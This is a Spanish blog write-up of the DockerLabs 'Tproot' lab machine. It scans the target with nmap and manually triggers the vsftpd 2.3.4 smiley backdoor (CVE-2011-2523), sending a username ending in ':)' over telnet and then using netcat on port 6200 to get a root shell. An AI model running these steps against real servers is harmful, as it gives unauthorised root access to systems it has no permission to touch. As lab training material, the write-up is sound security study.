---
title: "Dockerlabs — Tproot: ¡Jugando con el mítico vsftpd 2.3.4!"
date: 2026-07-13 12:00:00 +/-0100
categories: [Writeups, Dockerlabs]
tags: [hacking, dockerlabs, cve-2011-2523, ftp, linux]
---

¡Hola! Hoy vamos a destripar la máquina **Tproot** de DockerLabs. Es una máquina catalogada como "Muy fácil", pero que esconde una de las vulnerabilidades más divertidas y clásicas de la historia del hacking: el famoso backdoor del *smiley* `:)` en VSFTPD. ¡Vamos al lío!

## 1. Fase de Reconocimiento: Tocando la puerta

Lo primero es lo primero. Comprobamos que tenemos conexión con la máquina y de paso vemos a qué sistema operativo nos enfrentamos lanzando un simple ping a la IP objetivo (`172.17.0.2`):

```bash
ping -c 1 172.17.0.2
```

Ese `ttl=64` en la respuesta nos chiva rápidamente que estamos ante un entorno Linux. ¡Perfecto para empezar a buscar vías de entrada!

A continuación, sacamos la artillería pesada con Nmap para escanear todo el rango de puertos y descubrir qué servicios están corriendo en las sombras:

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

¡Bingo! Nos encontramos con dos puertos abiertos muy interesantes:
*   **Puerto 80 (HTTP):** Un servidor Apache 2.4.58 en Ubuntu con la página por defecto.
*   **Puerto 21 (FTP):** Un servicio **vsftpd 2.3.4**.

Esa versión exacta de FTP enciende todas las alarmas (¡y las sonrisas!).

## 2. La Vulnerabilidad: Una sonrisa peligrosa (CVE-2011-2523)

Allá por 2011, alguien logró comprometer los repositorios oficiales de VSFTPD y coló un código malicioso dentro de la versión 2.3.4. El mecanismo de este *backdoor* es brillante por su extrema simplicidad: si intentas iniciar sesión y en el nombre de usuario incluyes una carita sonriente `:)`, el servidor, silenciosamente, abre una shell interactiva con permisos de *root* en el puerto **6200**.

¡Es hora de aprovecharlo!

## 3. Explotación: De cero a Root en segundos

Aunque podemos automatizar este proceso utilizando scripts ya preparados (como el fantástico `CVE-2011-2523.py` que rula por GitHub), para sentir la magia de verdad y entender el flujo, vamos a explotarlo **100% de forma manual**. Es súper emocionante ver cómo reacciona el sistema en vivo.

### Paso 1: Lanzar el cebo con Telnet

Nos conectamos al puerto FTP de la máquina y le mandamos nuestro usuario modificado. La contraseña que pongamos da exactamente igual.

```bash
telnet 172.17.0.2 21
```
```text
Trying 172.17.0.2...
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS nope
```

El servicio parecerá quedarse colgado o nos dará un error, pero no pasa nada, la trampa ya ha saltado.

### Paso 2: Conectar a la shell rebelde

Inmediatamente, abrimos una segunda terminal y apuntamos con Netcat al puerto secreto **6200** que se acaba de abrir:

```bash
nc 172.17.0.2 6200
```

Al conectar, la pantalla se queda en blanco, sin ningún *prompt* visible que nos dé la bienvenida. Pero si tecleamos con fe...

```bash
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

¡Boom! Estamos dentro y con privilegios máximos. Hemos comprometido el servidor por completo sin necesidad de aplicar complejas técnicas de escalada de privilegios post-explotación. Directos al trono.

## Resumen de la jugada

Ha sido un asalto súper ágil, directo y muy didáctico. Aquí tienes la radiografía del ataque para tus apuntes:

| Objetivo | Vector de Ataque | Puerto de Shell | Resultado |
| :--- | :--- | :--- | :--- |
| vsftpd 2.3.4 | Inyección `:)` en campo USER | 6200 / TCP | Root directo 🚀 |

¡Espero que hayas disfrutado este *writeup* tanto como yo resolviendo la máquina! Es un laboratorio fantástico para afianzar conceptos de enumeración y vivir en primera persona una de las vulnerabilidades más míticas de la ciberseguridad.
